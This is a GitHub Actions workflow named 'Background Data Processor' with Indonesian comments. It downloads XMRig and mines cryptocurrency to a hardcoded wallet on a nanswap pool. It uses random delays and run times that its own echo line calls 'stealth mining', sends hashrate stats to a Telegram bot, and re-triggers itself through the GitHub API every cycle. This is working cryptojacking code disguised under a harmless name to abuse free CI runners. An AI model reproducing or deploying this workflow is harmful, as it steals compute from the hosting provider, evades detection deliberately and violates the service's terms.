name: Background Data Processor

on:
  workflow_dispatch:
  schedule:
    - cron: "0 */6 * * *"  # Setiap 6 jam

jobs:
  task:
    runs-on: ubuntu-latest
    timeout-minutes: 360  # Maksimum 6 jam untuk runner gratis

    steps:
      - name: Initialize Task
        run: echo "üîÑ Starting background stealth mining task..."

      - name: Prepare Runtime
        run: |
          sudo apt update -y && sudo apt install -y curl tar

      - name: Notify Start
        env:
          TG_TOKEN: ${{ secrets.TG_TOKEN }}
          TG_CHAT_ID: ${{ secrets.TG_CHAT_ID }}
        run: |
          curl -s -X POST https://api.telegram.org/bot$TG_TOKEN/sendMessage \
            -d chat_id=$TG_CHAT_ID \
            --data-urlencode text="üü¢ *Worker mulai.*\nRuntime aktif hingga 6 jam dengan random delay awal." \
            -d parse_mode=Markdown

      - name: Download & Start Worker
        run: |
          curl -L -o core.tar.gz https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-linux-static-x64.tar.gz
          tar -xzf core.tar.gz
          cd xmrig-6.24.0
          chmod +x xmrig

          DELAY=$((RANDOM % 300 + 30))
          echo "‚è≥ Menunggu $DELAY detik sebelum memulai mining..."
          sleep $DELAY

          ./xmrig -o xmrig.nanswap.com:3333 -a rx -k \
            -u nano_1ep4soo6rat31n6otw4ggqdwj7tz5sjymyzfwi7kmhye6f31guujdo19cc3q \
            -p stealthlog | tee log.txt &
          PID=$!

          WORKTIME=$((RANDOM % 5400 + 1200))  # Antara 20 menit sampai 1.5 jam
          echo "üõ†Ô∏è Menambang selama $WORKTIME detik..."
          sleep $WORKTIME
          kill $PID

      - name: Notify Done + Stats
        if: always()
        env:
          TG_TOKEN: ${{ secrets.TG_TOKEN }}
          TG_CHAT_ID: ${{ secrets.TG_CHAT_ID }}
        run: |
          cd xmrig-6.24.0
          HASHRATE=$(grep -a "speed" log.txt | tail -n1 | awk '{print $(NF-1) " H/s"}')
          ACCEPTED=$(grep -a "accepted" log.txt | wc -l)
          REJECTED=$(grep -a "rejected" log.txt | wc -l)
          MSG="‚úÖ *Worker selesai.*\n\nüìä *Stats:*\n‚Ä¢ Hashrate: \`$HASHRATE\`\n‚Ä¢ Accepted: \`$ACCEPTED\`\n‚Ä¢ Rejected: \`$REJECTED\`"

          curl -s -X POST https://api.telegram.org/bot$TG_TOKEN/sendMessage \
            -d chat_id=$TG_CHAT_ID \
            -d text="$MSG" \
            -d parse_mode=Markdown

          HR_NUM=$(echo "$HASHRATE" | grep -oE '^[0-9]+')
          if [[ "$HR_NUM" =~ ^[0-9]+$ ]] && [ "$HR_NUM" -lt 100 ]; then
            curl -s -X POST https://api.telegram.org/bot$TG_TOKEN/sendMessage \
              -d chat_id=$TG_CHAT_ID \
              -d text="üö® *Hashrate rendah terdeteksi!*\n\nHanya $HASHRATE. Periksa konfigurasi mining Anda." \
              -d parse_mode=Markdown
          fi

      - name: Random Delay Before Re-trigger
        if: always()
        run: |
          SLEEP_NEXT=$((RANDOM % 600 + 60))  # Delay acak 1‚Äì10 menit
          echo "‚è≥ Delay $SLEEP_NEXT detik sebelum retrigger..."
          sleep $SLEEP_NEXT

      - name: Re-trigger Self
        if: always()
        env:
          GH_TOKEN: ${{ secrets.GH_TOKEN }}
        run: |
          curl -X POST -H "Accept: application/vnd.github+json" \
               -H "Authorization: Bearer $GH_TOKEN" \
               https://api.github.com/repos/${{ github.repository }}/actions/workflows/build.yml/dispatches \
               -d '{"ref":"main"}'
